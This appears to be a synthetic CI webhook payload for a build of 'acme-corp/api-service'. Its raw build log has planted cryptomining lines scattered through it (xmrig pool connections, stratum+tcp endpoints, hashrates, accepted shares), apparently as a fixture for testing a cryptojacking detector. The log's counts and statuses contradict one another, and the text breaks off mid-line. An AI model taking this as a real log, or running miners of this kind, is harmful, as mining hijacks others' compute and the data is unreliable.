{
  "action": "completed",
  "workflow_run": {
    "id": 908,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "78568d42a7541a04332ae9a5bbdeaf58d0d9a3b9",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-10T12:20:15.408148Z",
    "updated_at": "2025-12-10T12:33:54.848954Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: checkout ===\nCompiling src/handler.rs...\n  PASS: test_api_health (63ms)\nUsing Node.js 15.20.9\nBundling main.js\n  PASS: e2e/test_cache_hit.spec.js\nMinifying main.js\nCompiling lib/utils.go...\nCache miss for key-5566\n[12:20:15] WARN: Deprecated API usage\nImage pulled successfully\nSuccess!\nSnapshots: 39 passed, 40 total\n[12:20:15] INFO: Processing request\nBundling styles.css\n[12:20:15] INFO: Starting build process\nStep 16/22: Installing dependencies\nPushing to registry...\nyarn add: Done in 6.64s\npip: Installing build dependencies...\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip: Downloading eslint-4.9.tar.gz\nOK\nArtifact uploaded: build.tar.gz (19MB)\nnpm notice: created a lockfile\npip install: Successfully installed lodash-1.8\nCompleted.\npip: Downloading axios-4.0.tar.gz\nEnvironment: production\n[12:20:15] DEBUG: Connection pool: 18 active\nTests: 294 passed, 195 total\nInstalling lodash@1.1.1\npip: Collecting react\nUsing Python 3.11\n\u2713 Task completed in 3570ms\npip: Downloading lodash-5.7.tar.gz\nLayer 6/10: ENV command\nGenerating source maps...\nAlready up to date.\n[12:20:15] DEBUG: Query executed in 79ms\npip: Downloading prettier-4.11.tar.gz\nSnapshots: 34 passed, 27 total\nBundling main.css\n  PASS: test_api_health (130ms)\nDone.\nBuilding Docker image...\nInstalling axios@1.12.6\nWARNING: webpack has known vulnerabilities\nPlatform: win32-x64\nArtifact uploaded: build.tar.gz (50MB)\n[12:20:15] ERROR: Connection failed\nLayer 7/9: ENV command\nnpm notice: created a lockfile\n[12:20:15] INFO: Cache refreshed\n[12:20:15] WARN: Deprecated API usage\nLayer 9/11: ENV command\nConnection established\nChecking out main branch\nnpm install: resolved 1191 packages\nPlatform: linux-x64\nSwitched to branch 'feature/task-940'\npip: Collecting jest\n[12:20:15] DEBUG: Connection pool: 1 active\nGET /api - 204 (57ms)\nGenerating source maps...\nWaiting...\nTime: 62.894s\npip: Downloading jest-5.3.tar.gz\n[12:20:15] INFO: Cache refreshed\nTLS handshake completed\nCompleted.\nCoverage: 83% statements, 71% branches\nWaiting...\nConnection established\n[12:20:15] DEBUG: Query executed in 21ms\n[12:20:15] DEBUG: Memory usage: 1834MB\nnpm notice: created a lockfile\n\u2713 All checks passed\nCache invalidated: dependencies\nUsing Python 3.11\n\u2713 package completed\nGET /status - 204 (99ms)\nStep 10/22: Deploying\nSnapshots: 3 passed, 37 total\nUsing Python 3.9\nCache miss for key-4432\nCache miss for key-7503\n\u2717 build failed with exit code 45\n[12:20:15] DEBUG: Query executed in 22ms\nNODE_ENV=development\nConnecting to acme.corp:443...\nCreating production build...\nTest Suites: 50 passed, 24 total\nWARNING: webpack has known vulnerabilities\npip install: Successfully installed prettier-1.10\nTest Suites: 49 passed, 40 total\nnpm install: resolved 1162 packages\npip: Downloading eslint-1.10.tar.gz\nyarn add: Done in 6.58s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUploading artifact 'coverage' (24 files)\nPushing to registry...\nyarn add: Done in 17.90s\nCompiling components/index.js...\nCache hit for key-3124\nBuilding Docker image...\nBuilding Docker image...\nVerifying...\nStep 18/22: Building\nStep 13/21: Building\nTime: 1.625s\nChecking out main branch\nStep 14/19: Testing\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nReady.\nImage pulled successfully\nBundling vendor.js\nRan 31 tests in 29s\npip: Installing build dependencies...\n[12:20:15] DEBUG: Query executed in 89ms\nCache miss for key-9208\n[12:20:15] WARN: Deprecated API usage\n[12:20:15] DEBUG: Query executed in 69ms\nLayer 10/9: ENV command\nAlready up to date.\nLayer 10/14: ENV command\n  PASS: unit/test_api_health.spec.js\nnpm notice: created a lockfile\n  PASS: test_db_connect (271ms)\nUploading artifact 'build' (19 files)\n[12:20:15] DEBUG: Query executed in 44ms\nyarn add: Done in 28.64s\nBundling main.js\nnpm notice: created a lockfile\nStep 9/15: Running migrations\nPOST /api - 200 (463ms)\n  PASS: test_cache_hit (72ms)\nPushing to registry...\nStep 19/19: Deploying\nCache miss for key-8392\nStep 17/20: Installing dependencies\nHEAD is now at 6e4a746\nStep 17/24: Linting\nnpm install: added 159 packages\nWARNING: react has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:20:15] DEBUG: Memory usage: 1152MB\nAlready up to date.\n[12:20:15] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (11MB)\nLayer 6/10: COPY command\nyarn add: Done in 12.62s\n[12:20:15] INFO: Cache refreshed\nnpm notice: package.json updated\nChecking out develop branch\nPushing to registry...\npip install: Successfully installed axios-1.11\nGET /api - 200 (67ms)\nTest Suites: 16 passed, 6 total\nCache miss for key-7907\nStep 10/20: Testing\nChecking out main branch\nyarn add: Done in 21.43s\nUploading artifact 'build' (15 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCreating production build...\nCreating production build...\nUploading artifact 'dist' (30 files)\nOptimizing 61 modules...\nCreating production build...\n[12:20:15] INFO: Cache refreshed\n[12:20:15] INFO: Processing request\nHEAD is now at 6fcc787\nArtifact uploaded: build.tar.gz (18MB)\nWARNING: webpack has known vulnerabilities\nDone.\nPOST /data - 202 (247ms)\nNODE_ENV=test\nStep 10/21: Testing\nChecking out master branch\nnpm install: resolved 598 packages\n  PASS: test_auth_login (378ms)\nArtifact uploaded: build.tar.gz (24MB)\nBundling styles.js\nEnvironment: staging\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 13/17: Testing\nnpm install: resolved 628 packages\nHEAD is now at 04c33a8\nSnapshots: 44 passed, 13 total\nPOST /data - 201 (350ms)\n=== Step checkout completed ===\n=== Step: setup_node ===\nEnvironment: production\nCreating production build...\nSuccess!\nTest Suites: 7 passed, 5 total\nChecking out master branch\nTime: 17.785s\nSuccess!\nNODE_ENV=production\nGET /health - 201 (71ms)\nAlready up to date.\nStep 17/18: Deploying\nCache restored successfully (76MB)\nDone.\nWARNING: jest has known vulnerabilities\nAlready up to date.\n[12:20:15] ERROR: Connection failed\n  PASS: test_cache_hit (484ms)\nArtifact downloaded: 26MB\n[12:20:15] DEBUG: Memory usage: 1183MB\nCache miss for key-6623\nTLS handshake completed\n[12:20:15] DEBUG: Connection pool: 20 active\nException: TypeError\nBuilding Docker image...\n\u2713 Task completed in 3374ms\nyarn add: Done in 15.83s\nOptimizing 60 modules...\nArtifact uploaded: build.tar.gz (10MB)\n[12:20:15] INFO: Cache refreshed\nFetching submodules...\nnpm install: added 337 packages\nPlatform: darwin-arm64\nPOST /api - 201 (475ms)\nNODE_ENV=development\nSwitched to branch 'hotfix/task-263'\npip: Downloading eslint-3.8.tar.gz\nCache miss for key-7163\n[12:20:15] ERROR: Connection failed\n[12:20:15] INFO: Processing request\nArtifact downloaded: 7MB\nOptimizing 90 modules...\nUsing Python 3.9\n[12:20:15] DEBUG: Initializing service\n  PASS: test_db_connect (212ms)\nWARNING: axios has known vulnerabilities\nNODE_ENV=production\nCache saved successfully\nOK\nInstalling eslint@1.1.9\nArtifact uploaded: build.tar.gz (32MB)\nReady.\nnpm notice: created a lockfile\nGenerating source maps...\nCompiling utils/service.java...\nPOST /data - 202 (475ms)\nPulling image: alpine:18\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUsing Node.js 20.8.4\nVerifying...\nnpm notice: package.json updated\nBundling vendor.css\nNODE_ENV=test\nWARNING: lodash has known vulnerabilities\nFinished.\nPOST /upload - 200 (390ms)\nException: RuntimeError\nnpm notice: created a lockfile\n[12:20:15] DEBUG: Query executed in 7ms\nGenerating source maps...\nBuilding Docker image...\nMinifying main.js\nCache restored successfully (422MB)\npip: Downloading jest-5.3.tar.gz\nUsing Python 3.10\nWARNING: lodash has known vulnerabilities\nyarn add: Done in 30.48s\nTest Suites: 17 passed, 10 total\nGET /status - 204 (53ms)\n[12:20:15] DEBUG: Connection pool: 15 active\nInstalling webpack@2.16.5\nBuilding Docker image...\nConnecting to test.io:443...\nFinished.\nException: NullPointerException\nSwitched to branch 'hotfix/task-474'\n[12:20:15] DEBUG: Query executed in 30ms\nStep 1/17: Building\nPulling image: node:18\n  PASS: e2e/test_db_connect.spec.js\nArtifact uploaded: dist.zip (18MB)\nSuccess!\nUsing Python 3.12\nCache saved successfully\nUploading artifact 'coverage' (50 files)\n[12:20:15] INFO: Connecting to database\nyarn add: Done in 4.55s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:20:15] DEBUG: Query executed in 94ms\npip: Collecting react\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (47MB)\n[12:20:15] INFO: Starting build process\nStep 1/15: Testing\n\u2713 Step 'checkout' succeeded\nCache miss for key-2996\nInstalling react@1.4.1\nStep 6/25: Testing\nCreating production build...\n  PASS: e2e/test_db_connect.spec.js\n[12:20:15] DEBUG: Connection pool: 9 active\n[12:20:15] INFO: Connecting to database\n  PASS: test_api_health (64ms)\nCoverage: 99% statements, 91% branches\nPulling image: node:18\nBundling styles.js\nSwitched to branch 'hotfix/task-851'\npip: Installing build dependencies...\n\u2713 test completed\nWARNING: webpack has known vulnerabilities\n[12:20:15] WARN: Deprecated API usage\nTransforming 811 files...\nFetching submodules...\nVerifying...\n  PASS: integration/test_cache_hit.spec.js\nStep 17/20: Building\nPushing to registry...\nnpm install: resolved 366 packages\n[12:20:15] WARN: Deprecated API usage\nCreating production build...\nCompiling src/main.py...\n[12:20:15] DEBUG: Memory usage: 1857MB\nHEAD is now at edd0bdf\nSuccess!\n[12:20:15] WARN: Deprecated API usage\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nGenerating source maps...\nOptimizing 26 modules...\npip install: Successfully installed jest-1.5\nConnection established\nTests: 56 passed, 254 total\nCache restored successfully (325MB)\nTransforming 293 files...\nDone.\nConnection established\nFAILED: test_auth_login\nGenerating source maps...\nnpm notice: created a lockfile\n[12:20:15] ERROR: Connection failed\nConnection established\nTest Suites: 33 passed, 22 total\nTransforming 272 files...\nCache saved successfully\nDone.\nDone.\n  PASS: unit/test_user_create.spec.js\nyarn add: Done in 28.46s\nCompiling utils/utils.go...\n[12:20:15] DEBUG: Initializing service\nCache restored successfully (355MB)\n[12:20:15] WARN: Deprecated API usage\n[12:20:15] DEBUG: Loading configuration\nOptimizing 97 modules...\npip install: Successfully installed eslint-5.17\nUploading artifact 'coverage' (37 files)\nArtifact uploaded: build.tar.gz (31MB)\nTest Suites: 17 passed, 17 total\nInstalling webpack@3.3.2\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\nOK\nCompiling utils/handler.rs...\nyarn add: Done in 17.20s\n[12:20:15] DEBUG: Connection pool: 3 active\nPushing to registry...\n\u2717 build failed with exit code 69\n[12:20:15] DEBUG: Initializing service\nBundling main.css\nCache hit for key-7227\npip: Downloading webpack-4.18.tar.gz\nCache miss for key-1099\nPulling image: alpine:18\nStep 14/19: Linting\nStep 13/19: Installing dependencies\nCache restored successfully (355MB)\npip: Downloading react-4.8.tar.gz\nCache saved successfully\n[12:20:15] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nException: ValueError\nException: RuntimeError\n=== Step setup_node completed ===\n=== Step: build ===\nCompiling components/main.py...\nBundling main.js\n[12:20:15] INFO: Processing request\n[12:20:15] DEBUG: Loading configuration\nLayer 10/11: ENV command\nUsing Python 3.12\nFinished.\nGET /health - 200 (29ms)\n[12:20:15] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2717 build failed with exit code 116\nSnapshots: 10 passed, 39 total\nChecking out master branch\nMinifying app.js\nFetching submodules...\nnpm notice: created a lockfile\nTLS handshake completed\nSnapshots: 50 passed, 3 total\nVerifying...\n[12:20:15] DEBUG: Query executed in 43ms\nPushing to registry...\nOptimizing 39 modules...\ncryptonight: Hashrate: 5027 H/s\nInstalling lodash@2.11.3\nOptimizing 69 modules...\nTLS handshake completed\n[12:20:15] ERROR: Connection failed\nLoading...\nCompiling components/utils.go...\nAccepted share #330\nnpm notice: created a lockfile\nPlatform: win32-x64\npip: Installing build dependencies...\nSuccess!\n[12:20:15] DEBUG: Connection pool: 14 active\nSwitched to branch 'hotfix/task-948'\nCompiling src/app.ts...\nStep 13/23: Deploying\n[12:20:15] DEBUG: Initializing service\nHEAD is now at 5537382\nStep 16/17: Building\nCompiling lib/app.ts...\npip install: Successfully installed lodash-5.16\nEnvironment: production\nminerd: 6 threads active\nnpm notice: package.json updated\nUsing Node.js 14.6.9\nStep 3/18: Testing\nCache invalidated: node_modules\nNODE_ENV=production\nPlatform: win32-x64\nNODE_ENV=development\nMinifying app.js\n[12:20:15] DEBUG: Memory usage: 1145MB\n\u2713 Step 'install' succeeded\nGPU #3: 64\u00b0C, mining\n[12:20:15] DEBUG: Query executed in 66ms\nBuilding Docker image...\nRan 22 tests in 49s\nCache invalidated: node_modules\nConnecting to startup.dev:443...\n[12:20:15] INFO: Processing request\nnpm install: resolved 110 packages\nMinifying main.js\nProcessing...\nWARNING: lodash has known vulnerabilities\nWaiting...\nPOST /data - 200 (120ms)\nMinifying vendor.js\nCompiling lib/service.java...\n[12:20:15] INFO: Starting build process\nStep 17/24: Running migrations\nNODE_ENV=production\nCompiling lib/main.py...\n[12:20:15] INFO: Connecting to database\n\u2713 build completed\nException: RuntimeError\n  PASS: integration/test_auth_login.spec.js\nConnecting to test.io:443...\nNODE_ENV=production\nWARNING: eslint has known vulnerabilities\nCache saved successfully\nUsing Node.js 16.0.4\nGenerating source maps...\nInstalling webpack@4.11.1\nProcessing...\npip: Collecting webpack\nnpm notice: package.json updated\nEnvironment: production\nCompleted.\nUsing Node.js 20.0.3\nBundling runtime.js\nConnecting to acme.corp:443...\npip: Collecting axios\npip: Collecting eslint\nFAILED: test_db_connect\n\u2713 All checks passed\n\u2713 Step 'checkout' succeeded\n\u2713 Step 'setup' succeeded\nStep 1/20: Installing dependencies\nxmrig: Starting mining on pool.test.io:3333\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnection established\n[12:20:15] DEBUG: Loading configuration\n[12:20:15] DEBUG: Loading configuration\nCreating production build...\nSnapshots: 1 passed, 48 total\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (26MB)\nUsing Node.js 18.1.0\nBuilding Docker image...\n[12:20:15] DEBUG: Connection pool: 20 active\npip: Collecting lodash\nCache saved successfully\nDone.\n[12:20:15] WARN: Deprecated API usage\nCache hit for key-6929\nxmrig: Starting mining on pool.cloud.services:3333\nOK\n[12:20:15] DEBUG: Connection pool: 20 active\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nException: ValueError\nCoverage: 76% statements, 65% branches\nChecking out develop branch\nRan 154 tests in 41s\nMinifying vendor.js\nOptimizing 87 modules...\nCompiling lib/handler.rs...\nStep 2/25: Building\nOptimizing 22 modules...\npip: Downloading axios-3.17.tar.gz\nPOST /api - 200 (62ms)\nFinished.\nCompiling utils/utils.go...\nMinifying app.js\nConnection established\nUsing Node.js 14.9.5\nWaiting...\nSnapshots: 34 passed, 45 total\n[12:20:15] DEBUG: Memory usage: 1088MB\nCache invalidated: build\nCache restored successfully (97MB)\n\u2713 All checks passed\nnpm notice: package.json updated\nCreating production build...\nStep 8/16: Linting\nException: NullPointerException\nLayer 7/15: ENV command\nFetching submodules...\nCompiling utils/index.js...\nImage pulled successfully\nException: TypeError\nTest Suites: 14 passed, 28 total\nWARNING: webpack has known vulnerabilities\nCache saved successfully\n[12:20:15] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: package.json updated\npip: Installing build dependencies...\nTests: 195 passed, 225 total\n\u2713 test completed\n[12:20:15] DEBUG: Connection pool: 20 active\n\u2713 Step 'setup' succeeded\nUsing Python 3.12\ncryptonight: Hashrate: 8771 H/s\nCompiling utils/handler.rs...\n[12:20:15] INFO: Processing request\npip: Downloading webpack-4.1.tar.gz\nOptimizing 23 modules...\nminerd: 13 threads active\n\u2713 Step 'build' succeeded\nCache invalidated: dependencies\nRan 164 tests in 39s\nTest Suites: 24 passed, 23 total\n[12:20:15] WARN: Deprecated API usage\nminerd: 15 threads active\nConnection established\nPOST /api - 202 (67ms)\nPlatform: win32-x64\nEnvironment: test\nConnecting to startup.dev:443...\n\u2713 Task completed in 4705ms\nCache restored successfully (494MB)\nNODE_ENV=production\nWARNING: axios has known vulnerabilities\n[12:20:15] INFO: Cache refreshed\nUsing Node.js 16.11.10\n[12:20:15] INFO: Processing request\nMinifying main.js\nCache miss for key-7074\nCompleted.\nnpm install: added 241 packages\nProcessing...\nInstalling lodash@2.13.10\nUsing Node.js 16.18.0\nTransforming 983 files...\nStep 1/21: Building\nCompiling src/app.ts...\n\u2717 build failed with exit code 119\n=== Step build completed ===\nConnecting to stratum+tcp://mine.cloud.services:3333\n=== Step: integration_tests ===\nChecking out develop branch\nStep 5/15: Deploying\nPushing to registry...\npip install: Successfully installed express-3.3\nCreating production build...\nInstalling react@1.4.8\nFetching submodules...\n\u2713 package completed\nSuccess!\nCache miss for key-7801\nPOST /upload - 201 (43ms)\nnpm install: added 321 packages\nUploading artifact 'coverage' (7 files)\nStep 3/22: Running migrations\nyarn add: Done in 15.22s\nBuilding Docker image...\nConnecting to acme.corp:443...\n[12:20:15] WARN: Deprecated API usage\nCompleted.\nVerifying...\nCache saved successfully\nxmrig: Starting mining on pool.acme.corp:3333\n[12:20:15] INFO: Connecting to database\n[12:20:15] DEBUG: Initializing service\nnpm notice: created a lockfile\nminerd: 16 threads active\nTime: 42.809s\nSnapshots: 6 passed, 11 total\nException: NullPointerException\nCreating production build...\nWARNING: express has known vulnerabilities\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 13/15: Installing dependencies\nCache invalidated: dependencies\nStep 11/17: Installing dependencies\nSwitched to branch 'hotfix/task-991'\nGET /api - 200 (13ms)\n[12:20:15] INFO: Request completed\nOptimizing 15 modules...\n[12:20:15] WARN: Deprecated API usage\nProcessing...\nWARNING: eslint has known vulnerabilities\nnpm install: added 65 packages\nEnvironment: production\nnpm notice: created a lockfile\nTLS handshake completed\nLoading...\nCache hit for key-8267\nCache restored successfully (259MB)\nDone.\n[12:20:15] INFO: Request completed\nCache miss for key-9300\nReady.\nAlready up to date.\n\u2713 Task completed in 462ms\nCache invalidated: dependencies\nGPU #1: 83\u00b0C, mining\nConnecting to stratum+tcp://mine.startup.dev:3333\nDone.\nCompiling utils/index.js...\nSnapshots: 18 passed, 3 total\n\u2713 All checks passed\nWARNING: jest has known vulnerabilities\nWARNING: lodash has known vulnerabilities\nBuilding Docker image...\n[12:20:15] INFO: Cache refreshed\n\u2713 Step 'checkout' succeeded\nArtifact downloaded: 22MB\nnpm install: resolved 1320 packages\nCreating production build...\nCreating production build...\n[12:20:15] DEBUG: Loading configuration\nyarn add: Done in 26.41s\n\u2713 test completed\n[12:20:15] DEBUG: Memory usage: 452MB\nCache hit for key-8439\nCompiling utils/app.ts...\nAlready up to date.\nChecking out master branch\nCoverage: 100% statements, 90% branches\n  PASS: unit/test_cache_hit.spec.js\n[12:20:15] INFO: Cache refreshed\nnpm notice: package.json updated\nBundling main.js\nStep 4/22: Installing dependencies\nReady.\n[12:20:15] DEBUG: Query executed in 70ms\nCompiling lib/index.js...\nPushing to registry...\nTransforming 859 files...\nAlready up to date.\nCache hit for key-7662\nCache saved successfully\n[12:20:15] DEBUG: Loading configuration\nEnvironment: test\ncryptonight: Hashrate: 9840 H/s\nCompiling utils/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nProcessing...\nCreating production build...\nConnecting to stratum+tcp://mine.example.com:3333\n[12:20:15] INFO: Connecting to database\nWARNING: react has known vulnerabilities\nGPU #2: 79\u00b0C, mining\nGenerating source maps...\nArtifact downloaded: 11MB\nStep 3/24: Testing\n[12:20:15] WARN: Deprecated API usage\nStep 13/24: Linting\nCompiling lib/handler.rs...\nUsing Node.js 15.16.8\nOptimizing 17 modules...\npip install: Successfully installed jest-3.4\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:15] INFO: Processing request\nnpm notice: created a lockfile\nNODE_ENV=development\nTests: 66 passed, 471 total\nStep 16/24: Deploying\nTests: 121 passed, 75 total\n[12:20:15] DEBUG: Connection pool: 10 active\nOptimizing 21 modules...\npip install: Successfully installed eslint-2.18\nLayer 7/14: COPY command\nSuccess!\nTransforming 915 files...\nStep 10/21: Linting\nDone.\n[12:20:15] WARN: Deprecated API usage\nTests: 209 passed, 201 total\nAccepted share #622\npip: Collecting react\npip: Installing build dependencies...\nWARNING: axios has known vulnerabilities\nFAILED: test_cache_hit\nCompiling components/index.js...\nCache restored successfully (215MB)\nGET /health - 204 (11ms)\nStep 14/23: Testing\nChecking out develop branch\n[12:20:15] INFO: Starting build process\nProcessing...\npip: Installing build dependencies...\nxmrig: Starting mining on pool.example.com:3333\n[12:20:15] INFO: Request completed\nGPU #3: 78\u00b0C, mining\nMinifying vendor.js\nArtifact uploaded: build.tar.gz (37MB)\nnpm notice: package.json updated\nNODE_ENV=test\nStep 6/22: Running migrations\nArtifact uploaded: dist.zip (17MB)\nUsing Node.js 20.3.0\n[12:20:15] WARN: Deprecated API usage\nCompiling utils/utils.go...\nyarn add: Done in 22.75s\n[12:20:15] INFO: Processing request\nConnection established\nUsing Node.js 17.6.8\nUsing Python 3.9\nImage pulled successfully\nStep 13/21: Installing dependencies\nLoading...\nWaiting...\nFetching submodules...\nArtifact uploaded: dist.zip (54MB)\npip: Downloading prettier-1.10.tar.gz\nSnapshots: 47 passed, 12 total\nGenerating source maps...\nStep 11/22: Deploying\n[12:20:15] DEBUG: Connection pool: 12 active\nnpm install: resolved 1455 packages\n  PASS: test_api_health (272ms)\nDone.\n\u2713 Step 'install' succeeded\nminerd: 5 threads active\nnpm notice: package.json updated\nPOST /data - 201 (371ms)\nAccepted share #905\nCompleted.\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\npip install: Successfully installed express-1.11\n\u2713 build completed\nTransforming 175 files...\nFetching submodules...\npip: Installing build dependencies...\nWARNING: react has known vulnerabilities\nUploading artifact 'dist' (19 files)\nLayer 5/14: COPY command\nUsing Python 3.12\n[12:20:15] DEBUG: Query executed in 43ms\nSnapshots: 3 passed, 42 total\nCache saved successfully\nSnapshots: 4 passed, 13 total\nPlatform: win32-x64\nPushing to registry...\npip: Installing build dependencies...\nnpm notice: package.json updated\nCompiling src/main.py...\npip: Installing build dependencies...\n=== Step integration_tests completed ===\n=== Step: install_dependencies ===\nLayer 1/10: COPY command\npip: Installing build dependencies...\nCache invalidated: build\n[12:20:15] DEBUG: Initializing service\nBuilding Docker image...\nCache miss for key-2456\nTests: 396 passed, 322 total\n[12:20:15] INFO: Processing request\nImage pulled successfully\nTests: 390 passed, 329 total\nOK\nAlready up to date.\nFinished.\nStep 14/18: Building\nException: RuntimeError\n\u2713 test completed\nOptimizing 26 modules...\n  PASS: test_cache_hit (372ms)\nEnvironment: staging\n[12:20:15] INFO: Starting build process\nCompiling components/index.js...\nArtifact uploaded: dist.zip (16MB)\nStep 18/23: Running migrations\nCompleted.\n[12:20:15] DEBUG: Memory usage: 1928MB\nWaiting...\nyarn add: Done in 19.88s\nSuccess!\nUsing Node.js 16.12.0\nBundling vendor.css\n[12:20:15] WARN: Deprecated API usage\npip: Downloading eslint-2.17.tar.gz\n[12:20:15] DEBUG: Connection pool: 3 active\nAlready up to date.\nWaiting...\nNODE_ENV=test\n[12:20:15] INFO: Cache refreshed\nCoverage: 86% statements, 100% branches\nStep 16/25: Linting\n\u2713 Step 'install' succeeded\n[12:20:15] INFO: Starting build process\nMinifying vendor.js\nFetching submodules...\nConnection established\nTests: 141 passed, 306 total\nPushing to registry...\nStep 7/23: Linting\n[12:20:15] ERROR: Connection failed\nMinifying app.js\nDone.\nFAILED: test_db_connect\npip: Collecting eslint\nFAILED: test_cache_hit\n[12:20:15] INFO: Cache refreshed\nGenerating source maps...\nWaiting...\nCompleted.\nPulling image: node:18\nFetching submodules...\nUploading artifact 'coverage' (43 files)\nCache restored successfully (393MB)\n  PASS: integration/test_user_create.spec.js\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 Task completed in 1493ms\nRan 185 tests in 33s\nStep 19/25: Testing\nUsing Node.js 19.20.4\nArtifact uploaded: dist.zip (63MB)\nPOST /upload - 201 (138ms)\n[12:20:15] WARN: Deprecated API usage\nCompiling lib/handler.rs...\npip: Downloading jest-1.16.tar.gz\nTLS handshake completed\nArtifact downloaded: 10MB\n[12:20:15] DEBUG: Memory usage: 1123MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 All checks passed\nAlready up to date.\nUploading artifact 'dist' (39 files)\nBundling styles.js\nNODE_ENV=test\nImage pulled successfully\nCompiling utils/index.js...\n[12:20:15] ERROR: Connection failed\nFetching submodules...\nCache saved successfully\nSnapshots: 30 passed, 47 total\nLoading...\nStep 5/22: Installing dependencies\nnpm install: added 451 packages\n\u2713 Step 'checkout' succeeded\n  PASS: test_db_connect (77ms)\n[12:20:15] INFO: Cache refreshed\n[12:20:15] WARN: Deprecated API usage\nLayer 8/10: ENV command\n[12:20:15] WARN: Deprecated API usage\nUsing Node.js 17.4.5\nBuilding Docker image...\n\u2713 Step 'checkout' succeeded\nStep 14/23: Linting\nTransforming 897 files...\nGET /api - 201 (48ms)\nCache invalidated: dependencies\nGET /health - 201 (69ms)\nPulling image: alpine:latest\nTest Suites: 8 passed, 34 total\n[12:20:15] INFO: Processing request\nGenerating source maps...\nDone.\n[12:20:15] WARN: Deprecated API usage\nTransforming 529 files...\nOptimizing 14 modules...\n  PASS: test_user_create (423ms)\nnpm notice: package.json updated\nProcessing...\nStep 6/18: Building\nnpm install: added 366 packages\nTransforming 936 files...\n[12:20:15] DEBUG: Memory usage: 771MB\nStep 17/17: Linting\n\u2713 Task completed in 4755ms\nArtifact uploaded: dist.zip (58MB)\nVerifying...\nnpm notice: package.json updated\nStep 18/19: Deploying\nnpm notice: created a lockfile\nnpm notice: package.json updated\n[12:20:15] INFO: Connecting to database\n[12:20:15] WARN: Deprecated API usage\n[12:20:15] DEBUG: Query executed in 96ms\nStep 13/25: Installing dependencies\n[12:20:15] INFO: Connecting to database\nCache saved successfully\n\u2713 All checks passed\nSuccess!\nPOST /upload - 202 (273ms)\nnpm notice: package.json updated\nPlatform: win32-x64\nBuilding Docker image...\nDone.\nImage pulled successfully\nSuccess!\nnpm notice: package.json updated\n\u2713 package completed\nConnecting to startup.dev:443...\nHEAD is now at 6b83106\n[12:20:15] DEBUG: Memory usage: 227MB\nStep 14/18: Building\n\u2713 Step 'test' succeeded\n\u2713 Task completed in 2791ms\nLayer 6/9: RUN command\nnpm notice: package.json updated\nCache hit for key-9980\nCompiling components/handler.rs...\nPlatform: linux-x64\nTLS handshake completed\n[12:20:15] INFO: Starting build process\n[12:20:15] INFO: Starting build process\nArtifact uploaded: build.tar.gz (7MB)\n\u2717 build failed with exit code 28\nBuilding Docker image...\nVerifying...\n\u2713 build completed\nGenerating source maps...\nGET /status - 204 (3ms)\nReady.\n[12:20:15] ERROR: Connection failed\nCache hit for key-4867\nyarn add: Done in 26.91s\nCache invalidated: build\n[12:20:15] INFO: Starting build process\nOK\nCompiling lib/handler.rs...\nEnvironment: test\npip: Collecting react\n[12:20:15] WARN: Deprecated API usage\nCompiling src/utils.go...\nGenerating source maps...\nReady.\nStep 9/20: Building\nTransforming 715 files...\nMinifying vendor.js\nnpm notice: package.json updated\n[12:20:15] INFO: Request completed\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nNODE_ENV=production\nTime: 16.927s\nStep 17/18: Linting\nArtifact uploaded: build.tar.gz (23MB)\n=== Step install_dependencies completed ===\n=== Step: setup_environment ===\nProcessing...\nPushing to registry...\nTest Suites: 50 passed, 45 total\nReady.\nPulling image: python:3.11\nNODE_ENV=production\n[12:20:15] INFO: Cache refreshed\n\u2713 Step 'build' succeeded\nUsing Node.js 18.8.7\nCreating production build...\nWARNING: jest has known vulnerabilities\n\u2713 All checks passed\n[12:20:15] WARN: Deprecated API usage\nImage pulled successfully\nStep 3/20: Testing\nNODE_ENV=test\nnpm install: resolved 1265 packages\nUsing Node.js 14.20.2\n\u2713 Step 'checkout' succeeded\n[12:20:15] DEBUG: Initializing service\n[12:20:15] DEBUG: Memory usage: 1035MB\nEnvironment: development\npip install: Successfully installed eslint-2.11\nAlready up to date.\nStep 17/20: Testing\nPlatform: darwin-arm64\n[12:20:15] INFO: Request completed\nnpm notice: package.json updated\nGET /health - 200 (7ms)\nSuccess!\nFinished.\nTest Suites: 29 passed, 38 total\nFinished.\nWARNING: axios has known vulnerabilities\nUsing Node.js 14.9.2\n[12:20:15] INFO: Cache refreshed\n[12:20:15] INFO: Connecting to database\nWARNING: lodash has known vulnerabilities\nStep 15/24: Running migrations\npip install: Successfully installed eslint-1.7\n[12:20:15] INFO: Starting build process\nCreating production build...\nOptimizing 51 modules...\nBundling styles.css\nConnecting to test.io:443...\npip: Installing build dependencies...\nInstalling webpack@1.2.7\nUsing Node.js 14.14.2\npip install: 